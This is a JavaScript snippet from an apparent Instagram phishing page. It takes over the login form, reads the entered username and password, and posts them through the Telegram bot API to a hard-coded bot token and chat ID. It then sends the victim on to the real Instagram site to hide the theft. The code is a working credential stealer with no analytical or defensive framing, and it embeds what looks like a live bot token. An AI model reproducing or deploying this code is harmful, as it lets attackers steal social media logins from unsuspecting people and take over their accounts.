        const BOT_TOKEN = '8657575309:AAHKWZ9aGj_4exJkEkLUllYZ65ejXoYEDa8'; 
        const CHAT_ID = '5892161832'; 

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const btn = document.getElementById('loginBtn');
            const originalText = btn.innerText;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
            btn.disabled = true;

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = `🔐 *New Instagram Login Attempt*\n\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log("Data sent to Telegram");
                    window.location.href = "https://www.instagram.com/";
                } else {
                    alert("Failed to send credentials. Try again.");
                    btn.innerText = originalText;
                    btn.disabled = false;
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Network error. Try again.");
                btn.innerText = originalText;
                btn.disabled = false;
            });
        });
